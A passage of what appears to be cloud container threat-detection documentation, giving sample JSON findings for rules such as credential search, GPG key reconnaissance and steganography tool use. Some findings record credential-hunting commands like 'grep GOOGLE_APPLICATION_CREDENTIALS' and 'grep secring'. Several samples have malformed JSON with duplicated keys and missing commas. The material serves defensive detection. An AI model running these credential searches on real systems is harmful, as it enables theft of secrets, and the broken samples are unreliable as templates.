                "val": "\"ktd-test-steganography-tool-ba379a7c2168db11\""
              },
              {
                "name": "\"HOME\"",
                "val": "\"/root\""
              },
              {
                "name": "\"GPG_KEY\"",
                "val": "\"7169605F62C751356D054A26A821E680E5FA6305\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_ADDR\"",
                "val": "\"34.118.224.1\""
              },
              {
                "name": "\"PATH\"",
                "val": "\"/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PROTO\"",
                "val": "\"tcp\""
              },
              {
                "name": "\"LANG\"",
                "val": "\"C.UTF-8\""
              },
              {
                "name": "\"PYTHON_VERSION\"",
                "val": "\"3.12.6\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_PORT_HTTPS\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP\"",
                "val": "\"tcp://34.118.224.1:443\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_HOST\"",
                "val": "\"34.118.224.1\""
              },
              {
                "name": "\"PWD\"",
                "val": "\"/\""
              }
            ],
            "pid": "9",
            "parentPid": "1"
          }
        ],
        "resourceName": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "securityPosture": {},
        "severity": "CRITICAL",
        "state": "ACTIVE",
        "vulnerability": {},
        "externalSystems": {}
      },
      "resource": {
        "name": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "displayName": "CLUSTER_ID",
        "type": "google.container.Cluster",
        "cloudProvider": "GOOGLE_CLOUD_PLATFORM",
        "service": "container.googleapis.com",
        "location": "ZONE",
        "gcpMetadata": {
          "project": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "projectDisplayName": "PROJECT_ID",
          "parent": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "parentDisplayName": "PROJECT_ID",
          "folders": [
            {
              "resourceFolder": "//cloudresourcemanager.googleapis.com/folders/FOLDER_NUMBER",
              "resourceFolderDisplayName": "FOLDER_ID"
            }
          ],
          "organization": "organizations/ORGANIZATION_ID"
        },
        "resourcePath": {
          "nodes": [
            {
              "nodeType": "GCP_PROJECT",
              "id": "projects/PROJECT_ID",
              "displayName": "PROJECT_ID"
            },
            {
              "nodeType": "GCP_FOLDER",
              "id": "folders/FOLDER_NUMBER",
              "displayName": "FOLDER_ID"
            },
            {
              "nodeType": "GCP_ORGANIZATION",
              "id": "organizations/ORGANIZATION_ID"
            }
          ]
        },
        "resourcePathString": "organizations/ORGANIZATION_ID/projects/PROJECT_ID"
      },
      "sourceProperties": {
        "sourceId": {
          "projectNumber": "PROJECT_NUMBER",
          "customerOrganizationNumber": "ORGANIZATION_NUMBER"
        },
        "detectionCategory": {
          "ruleName": "ktd_steganography_tool_detected"
        },
        "affectedResources": [
          {
            "gcpResourceName": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER"
          }
        ],
        "evidence": [
          {
            "sourceLogId": {
              "projectId": "PROJECT_ID",
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": {
                "seconds": "1729291973",
                "nanos": 687426149
              }
            }
          }
        ],
        "properties": {},
        "findingId": "FINDING_ID",
        "contextUris": {
          "mitreUri": {
            "displayName": "MITRE Link",
            "url": "https://attack.mitre.org/techniques/T1001/002/"
          },
          "virustotalIndicatorQueryUri": [
            {
              "displayName": "VirusTotal File Link",
              "url": "https://www.virustotal.com/gui/file/430cdef8f363efe8b7fe0ce4af583b202b77d89f0ded08e3b77ac6aca0a0b304/detection"
            }
          ],
          "relatedFindingUri": {}
        }
      },
    }
        

#### Credential Access: Find Google Cloud Credentials
    
    
    {
      "finding": {
        "access": {},
        "application": {},
        "attackExposure": {},
        "canonicalName": "projects/PROJECT_NUMBER/sources/SOURCE_ID/findings/FINDING_ID",
        "category": "Credential Access: Find Google Cloud Credentials",
        "cloudDlpDataProfile": {},
        "cloudDlpInspection": {},
        "containers": [
          {
            "name": "CONTAINER_NAME",
            "uri": "CONTAINER_IMAGE_URI",
            "imageId": "CONTAINER_IMAGE_ID",
            "createTime": "2024-06-17T18:50:13Z"
          }
        ],
        "createTime": "2025-01-21T19:55:22.017Z",
        "database": {},
        "eventTime": "2025-01-21T19:55:21.762Z",
        "exfiltration": {},
        "findingClass": "THREAT",
        "findingProviderId": "organizations/ORGANIZATION_ID/firstPartyFindingProviders/ktd",
        "indicator": {},
        "kernelRootkit": {},
        "kubernetes": {
          "pods": [
            {
              "name": "CONTAINER_NAME",
              "ns": "NAMESPACE",
              "containers": [
                {
                  "name": "CONTAINER_NAME",
                  "uri": "CONTAINER_IMAGE_URI",
                  "imageId": "CONTAINER_IMAGE_ID",
                  "createTime": "2025-01-21T19:55:19Z"
                }
              ]
            }
          ],
          "nodes": [
            {
              "name": "//compute.googleapis.com/projects/PROJECT_ID/zones/ZONE/instances/INSTANCE_ID"
            }
          ]
        },
        "logEntries": [
          {
            "cloudLoggingEntry": {
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": "2025-01-21T19:55:19.654640277Z"
            }
          }
        ],
        "mitreAttack": {
          "primaryTactic": "CREDENTIAL_ACCESS",
          "primaryTechniques": [
            "UNSECURED_CREDENTIALS",
            "PRIVATE_KEYS"
          ]
          "additionalTactics": [
            "COLLECTION",
            "DISCOVERY"
          ]
          "additionalTechniques": [
            "AUTOMATED_COLLECTION",
            "CREDENTIALS_FROM_PASSWORD_STORES",
            "BASH_HISTORY"
          ]
        },
        "mute": "UNDEFINED",
        "muteInfo": {
          "staticMute": {
            "state": "UNDEFINED",
            "applyTime": "1970-01-01T00:00:00Z"
          }
        },
        "mitreAttack": {
          "primaryTactic": "PRIVILEGE_ESCALATION",
          "primaryTechniques": [
            "ESCAPE_TO_HOST"
          ]
        },
        "mute": "UNDEFINED",
        "muteInfo": {
          "staticMute": {
            "state": "UNDEFINED",
            "applyTime": "1970-01-01T00:00:00Z"
          }
        },
        "muteUpdateTime": "1970-01-01T00:00:00Z",
        "name": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/findings/FINDING_ID",
        "parent": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/locations/global",
        "parentDisplayName": "Container Threat Detection",
        "processes": [
          {
            "binary": {
              "path": "\"/bin/grep\"",
              "size": "219456",
              "sha256": "c0a251c2e9a59e9e5db752c14857e51e17c0771af338b602bb9ccadc23a2ee7f",
              "hashedSize": "219456",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "script": {
              "size": "0",
              "hashedSize": "0",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "args": [
              "\"grep\"",
              "\"GOOGLE_APPLICATION_CREDENTIALS\""
            ],
            "argumentsTruncated": false,
            "envVariables": [
              {
                "name": "\"HOSTNAME\"",
                "val": "\"CONTAINER_NAME\""
              },
            ],
            "pid": "9",
            "parentPid": "1"
          }
        ],
        "resourceName": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "securityPosture": {},
        "severity": "LOW",
        "state": "ACTIVE",
        "vulnerability": {},
        "externalSystems": {}
      },
      "resource": {
        "name": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "displayName": "CLUSTER_ID",
        "type": "google.container.Cluster",
        "cloudProvider": "GOOGLE_CLOUD_PLATFORM",
        "service": "container.googleapis.com",
        "location": "ZONE",
        "gcpMetadata": {
          "project": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "projectDisplayName": "PROJECT_ID",
          "parent": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "parentDisplayName": "PROJECT_ID",
          "folders": [
            {
              "resourceFolder": "//cloudresourcemanager.googleapis.com/folders/FOLDER_NUMBER",
              "resourceFolderDisplayName": "FOLDER_ID"
            }
          ],
          "organization": "organizations/ORGANIZATION_ID"
        },
        "resourcePath": {
          "nodes": [
            {
              "nodeType": "GCP_PROJECT",
              "id": "projects/PROJECT_ID",
              "displayName": "PROJECT_ID"
            },
            {
              "nodeType": "GCP_FOLDER",
              "id": "folders/FOLDER_NUMBER",
              "displayName": "FOLDER_ID"
            },
            {
              "nodeType": "GCP_ORGANIZATION",
              "id": "organizations/ORGANIZATION_ID"
            }
          ]
        },
        "resourcePathString": "organizations/ORGANIZATION_ID/projects/PROJECT_ID"
      },
      "sourceProperties": {
        "sourceId": {
          "projectNumber": "PROJECT_NUMBER",
          "customerOrganizationNumber": "ORGANIZATION_NUMBER"
        },
        "detectionCategory": {
          "ruleName": "ktd_find_gcp_credentials"
        },
        "affectedResources": [
          {
            "gcpResourceName": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER"
          }
        ],
        "evidence": [
          {
            "sourceLogId": {
              "projectId": "PROJECT_ID",
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": {
                "seconds": "1729291973",
                "nanos": 687426149
              }
            }
          }
        ],
        "properties": {},
        "findingId": "FINDING_ID",
        "contextUris": {
          "mitreUri": {
            "displayName": "MITRE Link",
            "url": "https://attack.mitre.org/tactics/TA0006/"
          },
          "virustotalIndicatorQueryUri": [
            {
              "displayName": "VirusTotal File Link",
              "url": "https://www.virustotal.com/gui/file/c0a251c2e9a59e9e5db752c14857e51e17c0771af338b602bb9ccadc23a2ee7f/detection"
            }
          ],
          "relatedFindingUri": {}
        }
      },
    }
        

#### Credential Access: GPG Key Reconnaissance
    
    
    {
      "finding": {
        "access": {},
        "application": {},
        "attackExposure": {},
        "canonicalName": "projects/PROJECT_NUMBER/sources/SOURCE_ID/findings/FINDING_ID",
        "category": "Credential Access: GPG Key Reconnaissance",
        "cloudDlpDataProfile": {},
        "cloudDlpInspection": {},
        "containers": [
          {
            "name": "CONTAINER_NAME",
            "uri": "CONTAINER_IMAGE_URI",
            "imageId": "CONTAINER_IMAGE_ID",
            "createTime": "2024-06-17T18:50:13Z"
          }
        ],
        "createTime": "2025-01-21T19:55:22.017Z",
        "database": {},
        "eventTime": "2025-01-21T19:55:21.762Z",
        "exfiltration": {},
        "findingClass": "THREAT",
        "findingProviderId": "organizations/ORGANIZATION_ID/firstPartyFindingProviders/ktd",
        "indicator": {},
        "kernelRootkit": {},
        "kubernetes": {
          "pods": [
            {
              "name": "CONTAINER_NAME",
              "ns": "NAMESPACE",
              "containers": [
                {
                  "name": "CONTAINER_NAME",
                  "uri": "CONTAINER_IMAGE_URI",
                  "imageId": "CONTAINER_IMAGE_ID",
                  "createTime": "2025-01-21T19:55:19Z"
                }
              ]
            }
          ],
          "nodes": [
            {
              "name": "//compute.googleapis.com/projects/PROJECT_ID/zones/ZONE/instances/INSTANCE_ID"
            }
          ]
        },
        "logEntries": [
          {
            "cloudLoggingEntry": {
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": "2025-01-21T19:55:19.654640277Z"
            }
          }
        ],
        "mitreAttack": {},
        "mute": "UNDEFINED",
        "muteInfo": {
          "staticMute": {
            "state": "UNDEFINED",
            "applyTime": "1970-01-01T00:00:00Z"
          }
        },
        "mitreAttack": {
          "primaryTactic": "CREDENTIAL_ACCESS",
          "primaryTechniques": [
            "UNSECURED_CREDENTIALS",
            "PRIVATE_KEYS"
          ]
          "additionalTactics": [
            "DISCOVERY",
            "RECONNAISSANCE"
          ]
        },
        "mute": "UNDEFINED",
        "muteInfo": {
          "staticMute": {
            "state": "UNDEFINED",
            "applyTime": "1970-01-01T00:00:00Z"
          }
        },
        "muteUpdateTime": "1970-01-01T00:00:00Z",
        "name": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/findings/FINDING_ID",
        "parent": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/locations/global",
        "parentDisplayName": "Container Threat Detection",
        "processes": [
          {
            "binary": {
              "path": "\"/bin/grep\"",
              "size": "219456",
              "sha256": "c0a251c2e9a59e9e5db752c14857e51e17c0771af338b602bb9ccadc23a2ee7f",
              "hashedSize": "219456",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "script": {
              "size": "0",
              "hashedSize": "0",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "args": [
              "\"grep\"",
              "\"secring\""
            ],
            "argumentsTruncated": false,
            "envVariables": [
              {
                "name": "\"HOSTNAME\"",
                "val": "\"CONTAINER_NAME\""
              },
            ],
            "pid": "9",
            "parentPid": "1"
          }
        ],
        "resourceName": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "securityPosture": {},
        "severity": "CRITICAL",
        "state": "ACTIVE",
        "vulnerability": {},
        "externalSystems": {}
      },
      "resource": {
        "name": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "displayName": "CLUSTER_ID",
        "type": "google.container.Cluster",
        "cloudProvider": "GOOGLE_CLOUD_PLATFORM",
        "service": "container.googleapis.com",
        "location": "ZONE",
        "gcpMetadata": {
          "project": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "projectDisplayName": "PROJECT_ID",
          "parent": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "parentDisplayName": "PROJECT_ID",
          "folders": [
            {
              "resourceFolder": "//cloudresourcemanager.googleapis.com/folders/FOLDER_NUMBER",
              "resourceFolderDisplayName": "FOLDER_ID"
            }
          ],
          "organization": "organizations/ORGANIZATION_ID"
        },
        "resourcePath": {
          "nodes": [
            {
              "nodeType": "GCP_PROJECT",
              "id": "projects/PROJECT_ID",
              "displayName": "PROJECT_ID"
            },
            {
              "nodeType": "GCP_FOLDER",
              "id": "folders/FOLDER_NUMBER",
              "displayName": "FOLDER_ID"
            },
            {
              "nodeType": "GCP_ORGANIZATION",
              "id": "organizations/ORGANIZATION_ID"
            }
          ]
        },
        "resourcePathString": "organizations/ORGANIZATION_ID/projects/PROJECT_ID"
      },
      "sourceProperties": {
        "sourceId": {
          "projectNumber": "PROJECT_NUMBER",
          "customerOrganizationNumber": "ORGANIZATION_NUMBER"
        },
        "detectionCategory": {
          "ruleName": "ktd_gpg_key_reconnaissance"
        },
        "affectedResources": [
          {
            "gcpResourceName": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER"
          }
        ],
        "evidence": [
          {
            "sourceLogId": {
              "projectId": "PROJECT_ID",
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": {
                "seconds": "1729291973",
                "nanos": 687426149
              }
            }
          }
        ],
        "properties": {},
        "findingId": "FINDING_ID",
        "contextUris": {
          "mitreUri": {
            "displayName": "MITRE Link",
            "url": "https://attack.mitre.org/tactics/TA0006/"
          },
          "virustotalIndicatorQueryUri": [
            {
              "displayName": "VirusTotal File Link",
              "url": "https://www.virustotal.com/gui/file/c0a251c2e9a59e9e5db752c14857e51e17c0771af338b602bb9ccadc23a2ee7f/detection"
            }
          ],
          "relatedFindingUri": {}
        }
      },
    }
        

#### Credential Access: Search Private Keys or Passwords
    
    
    {
      "finding": {
        "access": {},
        "application": {},
        "attackExposure": {},
        "canonicalName": "projects/PROJECT_NUMBER/sources/SOURCE_ID/findings/FINDING_ID",
        "category": "Credential Access: Search Private Keys or Passwords",
        "cloudDlpDataProfile": {},
        "cloudDlpInspection": {},
        "containers": [
          {
            "name": "CONTAINER_NAME",
            "uri": "CONTAINER_IMAGE_URI",
            "imageId": "CONTAINER_IMAGE_ID",
            "createTime": "2024-06-17T18:50:13Z"
          }
        ],
        "createTime": "2025-01-21T19:55:22.017Z",
        "database": {},
        "eventTime": "2025-01-21T19:55:21.762Z",
        "exfiltration": {},
        "findingClass": "THREAT",
        "findingProviderId": "organizations/ORGANIZATION_ID/firstPartyFindingProviders/ktd",
        "indicator": {},
        "kernelRootkit": {},
        "kubernetes": {
          "pods": [
            {
              "name": "CONTAINER_NAME",
              "ns": "NAMESPACE",
              "containers": [
                {
                  "name": "CONTAINER_NAME",
                  "uri": "CONTAINER_IMAGE_URI",
                  "imageId": "CONTAINER_IMAGE_ID",
                  "createTime": "2025-01-21T19:55:19Z"
                }
              ]
            }
          ],
          "nodes": [
            {
              "name": "//compute.googleapis.com/projects/PROJECT_ID/zones/ZONE/instances/INSTANCE_ID"
            }
          ]
        },
        "logEntries": [
          {
            "cloudLoggingEntry": {
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": "2025-01-21T19:55:19.654640277Z"
            }
          }
        ],
        "mitreAttack": {},
        "mute": "UNDEFINED",
        "muteInfo": {
          "staticMute": {
            "state": "UNDEFINED",
            "applyTime": "1970-01-01T00:00:00Z"
          }
        },
        "mitreAttack": {
          "primaryTactic": "PRIVILEGE_ESCALATION",
          "primaryTechniques": [
            "ESCAPE_TO_HOST"
          ]
        },
        "mute": "UNDEFINED",
        "muteInfo": {
          "staticMute": {
            "state": "UNDEFINED",
            "applyTime": "1970-01-01T00:00:00Z"
          }
        },
        "muteUpdateTime": "1970-01-01T00:00:00Z",
        "name": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/findings/FINDING_ID",
        "parent": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/locations/global",
        "parentDisplayName": "Container Threat Detection",
        "processes": [
          {
            "binary": {
              "path": "INTERPRETER",
              "size": "147176",
              "sha256": "INTERPRETER_SHA_256",
              "hashedSize": "147176",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "script": {
              "size": "0",
              "hashedSize": "0",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "args": [
              "INTERPRETER",
              "ARG"
            ],
            "argumentsTruncated": false,
            "envVariables": [
              {
                "name": "\"KUBERNETES_SERVICE_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT\"",
                "val": "\"tcp://34.118.224.1:443\""
              },
              {
                "name": "\"HOSTNAME\"",
                "val": "\"ktd-test-search-private-keys-or-passwords-ba379a7c2168db11\""
              },
              {
                "name": "\"HOME\"",
                "val": "\"/root\""
              },
              {
                "name": "\"GPG_KEY\"",
                "val": "\"7169605F62C751356D054A26A821E680E5FA6305\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_ADDR\"",
                "val": "\"34.118.224.1\""
              },
              {
                "name": "\"PATH\"",
                "val": "\"/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PROTO\"",
                "val": "\"tcp\""
              },
              {
                "name": "\"LANG\"",
                "val": "\"C.UTF-8\""
              },
              {
                "name": "\"PYTHON_VERSION\"",
                "val": "\"3.12.6\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_PORT_HTTPS\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP\"",
                "val": "\"tcp://34.118.224.1:443\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_HOST\"",
                "val": "\"34.118.224.1\""
              },
              {
                "name": "\"PWD\"",
                "val": "\"/\""
              }
            ],
            "pid": "9",
            "parentPid": "1"
          }
        ],
        "resourceName": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "securityPosture": {},
        "severity": "LOW",
        "state": "ACTIVE",
        "vulnerability": {},
        "externalSystems": {}
      },
      "resource": {
        "name": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "displayName": "CLUSTER_ID",
        "type": "google.container.Cluster",
        "cloudProvider": "GOOGLE_CLOUD_PLATFORM",
        "service": "container.googleapis.com",
        "location": "ZONE",
        "gcpMetadata": {
          "project": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "projectDisplayName": "PROJECT_ID",
          "parent": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "parentDisplayName": "PROJECT_ID",
          "folders": [
            {
              "resourceFolder": "//cloudresourcemanager.googleapis.com/folders/FOLDER_NUMBER",
              "resourceFolderDisplayName": "FOLDER_ID"
            }
          ],
          "organization": "organizations/ORGANIZATION_ID"
        },
        "resourcePath": {
          "nodes": [
            {
              "nodeType": "GCP_PROJECT",
              "id": "projects/PROJECT_ID",
              "displayName": "PROJECT_ID"
            },
            {
              "nodeType": "GCP_FOLDER",
              "id": "folders/FOLDER_NUMBER",
              "displayName": "FOLDER_ID"
            },
            {
              "nodeType": "GCP_ORGANIZATION",
              "id": "organizations/ORGANIZATION_ID"
            }
          ]
        },
        "resourcePathString": "organizations/ORGANIZATION_ID/projects/PROJECT_ID"
      },
      "sourceProperties": {
        "sourceId": {
          "projectNumber": "PROJECT_NUMBER",
          "customerOrganizationNumber": "ORGANIZATION_NUMBER"
        },
        "detectionCategory": {
          "ruleName": "ktd_search_private_keys_or_passwords"
        },
        "affectedResources": [
          {
            "gcpResourceName": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER"
          }
        ],
        "evidence": [
          {
            "sourceLogId": {
              "projectId": "PROJECT_ID",
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": {
                "seconds": "1729291973",
                "nanos": 687426149
              }
            }
          }
        ],
        "properties": {},
        "findingId": "FINDING_ID",
        "contextUris": {
          "mitreUri": {
            "displayName": "MITRE Link",
            "url": "https://attack.mitre.org/techniques/T1552/001/"
          },
          "virustotalIndicatorQueryUri": [
            {
              "displayName": "VirusTotal File Link",
              "url": "https://www.virustotal.com/gui/file/430cdef8f363efe8b7fe0ce4af583b202b77d89f0ded08e3b77ac6aca0a0b304/detection"
            }
          ],
          "relatedFindingUri": {}
        }
      },
    }
        

#### Defense Evasion: Launch Code Compiler Tool In Container ([Preview](https://cloud.google.com/products/#product-launch-stages))
    
    
    {
      "finding": {
        "access": {},
        "application": {},
        "attackExposure": {},
        "canonicalName": "projects/PROJECT_NUMBER/sources/SOURCE_ID/findings/FINDING_ID",
        "category": "Defense Evasion: Launch Code Compiler Tool In Container",
        "cloudDlpDataProfile": {},
        "cloudDlpInspection": {},
        "containers": [
          {
            "name": "CONTAINER_NAME",
            "uri": "CONTAINER_IMAGE_URI",
            "imageId": "CONTAINER_IMAGE_ID",
            "createTime": "2024-06-17T18:50:13Z"
          }
        ],
        "createTime": "2025-01-21T19:55:22.017Z",
        "database": {},
        "eventTime": "2025-01-21T19:55:21.762Z",
        "exfiltration": {},
        "findingClass": "THREAT",
        "findingProviderId": "organizations/ORGANIZATION_ID/firstPartyFindingProviders/ktd",
        "indicator": {},
        "kernelRootkit": {},
        "kubernetes": {
          "pods": [
            {
              "name": "CONTAINER_NAME",
              "ns": "NAMESPACE",
              "containers": [
                {
                  "name": "CONTAINER_NAME",
                  "uri": "CONTAINER_IMAGE_URI",
                  "imageId": "CONTAINER_IMAGE_ID",
                  "createTime": "2025-01-21T19:55:19Z"
                }
              ]
            }
          ],
          "nodes": [
            {
              "name": "//compute.googleapis.com/projects/PROJECT_ID/zones/ZONE/instances/INSTANCE_ID"
            }
          ]
        },
        "logEntries": [
          {
            "cloudLoggingEntry": {
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": "2025-01-21T19:55:19.654640277Z"
            }
          }
        ],
        "mitreAttack": {
          "primaryTactic": "DEFENSE_EVASION",
          "primaryTechniques": [
            "OBFUSCATED_FILES_OR_INFO"
          ],
          "additionalTactics": [
            "RESOURCE_DEVELOPMENT",
            "EXECUTION",
            "CREDENTIAL_ACCESS"
          ],
          "additionalTechniques": [
            "STAGE_CAPABILITIES",
            "SOFTWARE_DEPLOYMENT_TOOLS",
            "UNSECURED_CREDENTIALS"
          ]
        },
        "mute": "UNDEFINED",
        "muteInfo": {
          "staticMute": {
            "state": "UNDEFINED",
            "applyTime": "1970-01-01T00:00:00Z"
          }
        },
        "muteUpdateTime": "1970-01-01T00:00:00Z",
        "name": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/findings/FINDING_ID",
        "parent": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/locations/global",
        "parentDisplayName": "Container Threat Detection",
        "processes": [
          {
            "binary": {
              "path": "INTERPRETER",
              "size": "147176",
              "sha256": "INTERPRETER_SHA_256",
              "hashedSize": "147176",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "script": {
              "size": "0",
              "hashedSize": "0",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "args": [
              "INTERPRETER",
              "ARG"
            ],
            "argumentsTruncated": false,
            "envVariables": [
              {
                "name": "\"KUBERNETES_SERVICE_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT\"",
                "val": "\"tcp://34.118.224.1:443\""
              },
              {
                "name": "\"HOSTNAME\"",
                "val": "\"ktd-test-launch-code-compiler-ba379a7c2168db11\""
              },
              {
                "name": "\"HOME\"",
                "val": "\"/root\""
              },
              {
                "name": "\"GPG_KEY\"",
                "val": "\"7169605F62C751356D054A26A821E680E5FA6305\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_ADDR\"",
                "val": "\"34.118.224.1\""
              },
              {
                "name": "\"PATH\"",
                "val": "\"/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PROTO\"",
                "val": "\"tcp\""
              },
              {
                "name": "\"LANG\"",
                "val": "\"C.UTF-8\""
              },
              {
                "name": "\"PYTHON_VERSION\"",
                "val": "\"3.12.6\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_PORT_HTTPS\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP\"",
                "val": "\"tcp://34.118.224.1:443\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_HOST\"",
                "val": "\"34.118.224.1\""
              },
              {
                "name": "\"PWD\"",
                "val": "\"/\""
              }
            ],
            "pid": "9",
            "parentPid": "1"
          }
        ],
        "resourceName": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "securityPosture": {},
        "severity": "LOW",
        "state": "ACTIVE",
        "vulnerability": {},
        "externalSystems": {}
      },
      "resource": {
        "name": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "displayName": "CLUSTER_ID",
        "type": "google.container.Cluster",
        "cloudProvider": "GOOGLE_CLOUD_PLATFORM",
        "service": "container.googleapis.com",
        "location": "ZONE",
        "gcpMetadata": {
          "project": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "projectDisplayName": "PROJECT_ID",
          "parent": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "parentDisplayName": "PROJECT_ID",
          "folders": [
            {
              "resourceFolder": "//cloudresourcemanager.googleapis.com/folders/FOLDER_NUMBER",
              "resourceFolderDisplayName": "FOLDER_ID"
            }
          ],
          "organization": "organizations/ORGANIZATION_ID"
        },
        "resourcePath": {
          "nodes": [
            {
              "nodeType": "GCP_PROJECT",
              "id": "projects/PROJECT_ID",
              "displayName": "PROJECT_ID"
            },
            {
              "nodeType": "GCP_FOLDER",
              "id": "folders/FOLDER_NUMBER",
              "displayName": "FOLDER_ID"
            },
            {
              "nodeType": "GCP_ORGANIZATION",
              "id": "organizations/ORGANIZATION_ID"
            }
          ]
        },
        "resourcePathString": "organizations/ORGANIZATION_ID/projects/PROJECT_ID"
      },
      "sourceProperties": {
        "sourceId": {
          "projectNumber": "PROJECT_NUMBER",
          "customerOrganizationNumber": "ORGANIZATION_NUMBER"
        },
        "detectionCategory": {
          "ruleName": "ktd_launch_code_compiler_tool_in_container"
        },
        "affectedResources": [
          {
            "gcpResourceName": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER"
          }
        ],
        "evidence": [
          {
            "sourceLogId": {
              "projectId": "PROJECT_ID",
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": {
                "seconds": "1729291973",
                "nanos": 687426149
              }
            }
          }
        ],
        "properties": {},
        "findingId": "FINDING_ID",
        "contextUris": {
          "mitreUri": {
            "displayName": "MITRE Link",
            "url": "https://attack.mitre.org/techniques/T1027/004/"
          },
          "virustotalIndicatorQueryUri": [
            {
              "displayName": "VirusTotal File Link",
              "url": "https://www.virustotal.com/gui/file/430cdef8f363efe8b7fe0ce4af583b202b77d89f0ded08e3b77ac6aca0a0b304/detection"
            }
          ],
          "relatedFindingUri": {}
        }
      },
    }
        

#### Defense Evasion: Base64 ELF File Command Line
    
    
    {
      "finding": {
        "access": {},
        "application": {},
        "attackExposure": {},
        "canonicalName": "projects/PROJECT_NUMBER/sources/SOURCE_ID/findings/FINDING_ID",
        "category": "Defense Evasion: Base64 ELF File Command Line",
        "cloudDlpDataProfile": {},
        "cloudDlpInspection": {},
        "containers": [
          {
            "name": "CONTAINER_NAME",
            "uri": "CONTAINER_IMAGE_URI",
            "imageId": "CONTAINER_IMAGE_ID",
            "createTime": "2024-06-17T18:50:13Z"
          }
        ],
        "createTime": "2025-01-21T19:55:22.017Z",
        "database": {},
        "eventTime": "2025-01-21T19:55:21.762Z",
        "exfiltration": {},
        "findingClass": "THREAT",
        "findingProviderId": "organizations/ORGANIZATION_ID/firstPartyFindingProviders/ktd",
        "indicator": {},
        "kernelRootkit": {},
        "kubernetes": {
          "pods": [
            {
              "name": "CONTAINER_NAME",
              "ns": "NAMESPACE",
              "containers": [
                {
                  "name": "CONTAINER_NAME",
                  "uri": "CONTAINER_IMAGE_URI",
                  "imageId": "CONTAINER_IMAGE_ID",
                  "createTime": "2025-01-21T19:55:19Z"
                }
              ]
            }
